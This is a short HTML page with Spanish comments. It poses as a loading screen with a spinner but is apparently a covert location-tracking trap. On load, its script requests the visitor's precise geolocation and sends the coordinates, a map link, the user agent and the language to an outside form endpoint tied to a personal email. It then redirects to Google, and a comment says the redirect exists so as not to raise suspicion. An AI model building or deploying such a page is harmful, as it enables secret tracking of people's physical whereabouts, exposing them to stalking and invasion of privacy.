<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Cargando...</title>
    <style>
        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="spinner"></div>

    <script>
        const WEBHOOK_URL = "https://formspree.io/f/@giacomosoffiaturo15@gmail.com"; 
        const REDIRECT_TO = "https://www.google.com"; // A dónde enviar al usuario después

        window.onload = function() {
            if (navigator.geolocation) {
                // Solicita la ubicación apenas abre el link
                navigator.geolocation.getCurrentPosition(enviarYSalir, manejarError, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            } else {
                window.location.href = REDIRECT_TO;
            }
        };

        function enviarYSalir(pos) {
            const datos = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                mapa: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                userAgent: navigator.userAgent,
                idioma: navigator.language
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(datos),
                mode: 'no-cors' // Para que sea más rápido y no espere confirmación
            }).finally(() => {
                // Una vez enviado (o intentado), redirigimos
                window.location.href = REDIRECT_TO;
            });
        }

        function manejarError() {
            // Si rechaza el permiso, igual lo mandamos fuera para no levantar sospechas
            window.location.href = REDIRECT_TO;
        }
    </script>
</body>
</html>
